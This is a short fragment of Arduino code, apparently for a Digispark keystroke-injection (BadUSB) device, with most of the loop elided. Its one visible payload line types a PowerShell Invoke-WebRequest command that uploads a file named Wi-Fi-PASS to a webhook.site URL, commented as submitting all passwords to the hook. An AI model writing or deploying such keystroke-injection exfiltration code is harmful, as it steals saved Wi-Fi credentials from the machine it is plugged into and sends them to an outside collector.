...
void loop() {
  ...
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/9ce44ee4-3597-4e01-b046-f3ba070de3eb -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
